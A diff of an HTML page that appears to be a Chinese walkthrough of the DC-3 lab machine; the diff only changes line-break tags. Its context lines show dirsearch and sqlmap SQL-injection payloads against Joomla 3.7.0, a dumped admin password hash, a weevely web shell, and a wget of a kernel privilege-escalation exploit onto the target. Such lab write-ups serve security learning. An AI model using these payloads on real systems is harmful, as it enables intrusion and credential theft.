@@ -311,7 +311,7 @@
 <p>dirsearch扫一下目录</p>
 <blockquote>
 <p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
-<br/>
+<br>
 
 <p>扫到了管理员登录页面</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
@@ -343,7 +343,7 @@
 </blockquote>
 <p>发现Joomal版本为3.7.0</p>
 <p>网上搜索相关漏洞发现存在SQL注入</p>
-<br/>
+<br>
 
 <blockquote>
 <p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
@@ -371,7 +371,7 @@
 <p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
 <p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
 </blockquote>
-<br/>
+<br>
 
 <p>给出了存在sql注入的url</p>
 <p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
@@ -394,16 +394,16 @@
 <blockquote>
 <p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+———-+————-+</p>
 </blockquote>
-<br/>
+<br>
 
 <p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T “#__users” -C “username,password” –dump  -p list[fullordering]</p>
 <blockquote>
 <p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+———-+————————————————————–+<br>| username | password                                                     |<br>+———-+————————————————————–+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+———-+————————————————————–+</p>
 </blockquote>
-<br/>
+<br>
 
 <p>把密码存储起来使用John爆破</p>
-<br/>
+<br>
 
 <blockquote>
 <p><code>vim dc3password_hash.txt</code></p>
@@ -435,7 +435,7 @@ $R=$Z('',$X);$R();
 <p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
 <p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
 <p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
-<br/>
+<br>
 </blockquote>
 <p>想办法提权</p>
 <p>查看靶机版本，发现为ubunutu16.04 内核版本为4.4.0-21</p>
@@ -452,9 +452,9 @@ $R=$Z('',$X);$R();
 <hr>
 <p>Shellcodes: No Results</p>
 </blockquote>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <blockquote>
 <p>www-data@DC-3:/var/www $ wget  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>–2021-05-01 23:52:54–  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:52:55–  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
@@ -462,17 +462,17 @@ $R=$Z('',$X);$R();
 <p>–2021-05-01 23:53:56–  (try: 2)  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443… failed: Connection refused.<br>Resolving github.com (github.com)… 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:54:18–  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.</p>
 </blockquote>
 <p>下载超时，尝试在kali先下载在让靶机在kiali上下载,最近VM虚拟机代理不管用了还在排查…</p>
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
 <p>总结</p>
 <ul>
